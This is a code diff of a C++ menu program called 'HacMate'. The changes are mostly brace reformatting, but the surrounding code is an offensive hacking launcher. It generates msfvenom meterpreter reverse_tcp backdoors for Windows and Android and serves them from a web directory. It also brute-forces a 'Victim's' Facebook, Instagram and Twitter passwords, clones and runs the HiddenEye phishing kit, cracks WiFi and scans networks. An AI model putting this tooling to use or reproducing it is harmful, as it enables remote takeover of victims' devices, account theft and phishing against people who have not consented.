@@ -1,6 +1,7 @@
 #include <iostream>
 #include <stdlib.h>
 #include <string.h>
+#include <math.h>
 
 void Net_Scanning();
 void Phishing();
@@ -12,9 +13,7 @@ void Custom_Password_List();
 
 using namespace std;
 
-
-void Custom_Password_List()
-{
+void Custom_Password_List() {
   char ch;
   cout<<"\n\n\n\t\t\x1B[34m* Do you want to install required tool (for new user) [Y/N]*\033[0m\t\t\n\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -24,12 +23,10 @@ void Custom_Password_List()
   system("cd cupp;python3 cupp.py -i");
 }
 
-void BackDoor()
-{
+void BackDoor() {
   char ch;
   int key;
-  while(key!=10)
-  {
+  while(key!=10) {
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"      1. Access Windows (BackDoor Access)\n";
     cout<<"      2. Access Android (BackDoor Access)\n";
@@ -37,10 +34,8 @@ void BackDoor()
     cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
     cin>>key;
     char ip[16];
-    switch (key)
-    {
-      case 1:
-      {
+    switch (key) {
+      case 1: {
         char gen_cmd[] = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=";
         cout<<"\n\n\n\t\t\x1B[34m* Enter your ip address (ifconfig) *\033[0m\t\t\n\n";
         cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -64,8 +59,7 @@ void BackDoor()
         system("rm /var/www/html/pgame.exe");
         break;
       }
-      case 2:
-      {
+      case 2: {
         char gen_cmd[] = "msfvenom -p android/meterpreter/reverse_tcp LHOST=";
         cout<<"\n\n\n\t\t\x1B[34m* Enter your ip address (ifconfig) *\033[0m\t\t\n\n";
         cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -89,8 +83,7 @@ void BackDoor()
         system("rm /var/www/html/pgame.apk");
         break;
       }
-      case 10:
-      {
+      case 10: {
 
         break;
       }
@@ -99,15 +92,12 @@ void BackDoor()
   }
 }
 
-
-void Pass_Cracking()
-{
+void Pass_Cracking() {
 
   char ch;
   int key;
 
-  while(key!=10)
-  {
+  while(key!=10) {
 
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"      1. Facebook Password Cracking (BruteForcing)\n";
@@ -119,10 +109,8 @@ void Pass_Cracking()
     char username[30];
     char pass_list[50];
 
-    switch(key)
-    {
-      case 1:
-       {
+    switch(key) {
+      case 1: {
         char cmd[] = "cd;brut3k1t -s facebook -u ";
         cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
         cin>>username;
@@ -134,8 +122,7 @@ void Pass_Cracking()
         system(cmd);
       }
       break;
-      case 2:
-      {
+      case 2: {
         char cmd[] = "cd;brut3k1t -s instagram -u ";
         cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
         cin>>username;
@@ -147,8 +134,7 @@ void Pass_Cracking()
         system(cmd);
       }
       break;
-      case 3:
-      {
+      case 3: {
         char cmd[] = "cd;brut3k1t -s twitter -u ";
         cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
         cin>>username;
@@ -163,16 +149,11 @@ void Pass_Cracking()
       case 10: return;
       break;
       default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
-
     }
   }
-
 }
 
-
-void Wifi_Hacking()
-{
-
+void Wifi_Hacking() {
   char ch;
   char wlan_name[10];
   cout<<"\n\n\n\t\t\x1B[34m* Enter Your Wireless Card id *\033[0m\t\t\n\n";
@@ -205,8 +186,6 @@ void Wifi_Hacking()
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>channel_no;
 
-
-
   cout<<"\n\n \t\t [ Enter the following command in NEW TERMINAL (in same directory) ] \n\n  \t\t\t\t airodump-ng -c <CH NO.> -w -b <MAC ADDRESS> wlan0mon\n\n\n \t ENTER ANY ALPHA KEY IF YOU ARE READY\n\n\n";
 
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -230,9 +209,7 @@ void Wifi_Hacking()
 }
 
 
-
-void Phishing()
-{
+void Phishing() {
   char ch;
   int key;
   cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
@@ -241,11 +218,8 @@ void Phishing()
   cout<<"      10. Go Back\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>key;
-  while(key!=10)
-  {
-
-    switch(key)
-    {
+  while(key!=10) {
+    switch(key) {
       case 1: system("cd HiddenEye;python3 HiddenEye.py");
       break;
       case 2: system("apt-get install git -y;git clone https://github.com/DarkSecDevelopers/HiddenEye.git;cd HiddenEye;pip install -r requirements.txt;pip3 install wget;python3 HiddenEye.py");
@@ -253,26 +227,20 @@ void Phishing()
       case 10: return;
       break;
       default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
-
     }
   }
   cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
-
 }
 
 
-
-void Net_Scanning()
-{
+void Net_Scanning() {
 
   char ip[30];
   char ch;
   int key;
-  while (key!=10)
-  {
-
+  while (key!=10) {
 
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"      1. Find Live Hosts on Network\n";
@@ -286,11 +254,8 @@ void Net_Scanning()
     cin>>key;
 
 
-    switch (key)
-    {
-
-      case 1:
-      {
+    switch (key) {
+      case 1: {
 
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -304,9 +269,7 @@ void Net_Scanning()
         cin>>ch;
       }
       break;
-      case 2:
-      {
-
+      case 2: {
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -317,12 +280,9 @@ void Net_Scanning()
         cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
         cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ch;
-
       }
       break;
-      case 3:
-      {
-
+      case 3: {
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -335,8 +295,7 @@ void Net_Scanning()
         cin>>ch;
       }
       break;
-      case 4:
-      {
+      case 4: {
 
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
@@ -350,9 +309,7 @@ void Net_Scanning()
         cin>>ch;
       }
       break;
-      case 5:
-      {
-
+      case 5: {
         system("locate .nse | grep ftp");
 
         cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
@@ -360,9 +317,7 @@ void Net_Scanning()
         cin>>ch;
       }
       break;
-      case 6:
-      {
-
+      case 6: {
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -383,8 +338,6 @@ void Net_Scanning()
 }
 
 
-
-
 int main()        //main function
 {
   system("clear");
@@ -396,18 +349,11 @@ int main()        //main function
 }
 
 
-
-
-void Choice()      //choice function definition
-{
+void Choice() {
   system("clear");
   int key;
-  while(key != 10)
-  {
-
-
+  while(key != 10) {
     cout<<"\n\n";
-
     cout<<"              HHH   HHH    MMM       MMM\n             HHH   HHH    MMMM     MMMM\n            HHHHHHHHH    MMM MM MM MMM\n           HHHHHHHHH    MMM  MMM  MMM\n          HHH   HHH    MMM   M   MMM\n         HHH   HHH    MMM       MMM";
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"     1. Network Scanning\n";
@@ -419,8 +365,7 @@ void Choice()      //choice function definition
     cout<<"\n\n     10. \x1B[91m\"\033[0mExit\x1B[91m\"\033[0m\t\t";
     cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
     cin>>key;
-      switch(key)
-      {
+      switch(key){
         case 1: Net_Scanning();
                 break;
         case 2:
@@ -442,8 +387,6 @@ void Choice()      //choice function definition
                 break;
         default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
       }
-
-
   }
 
 }
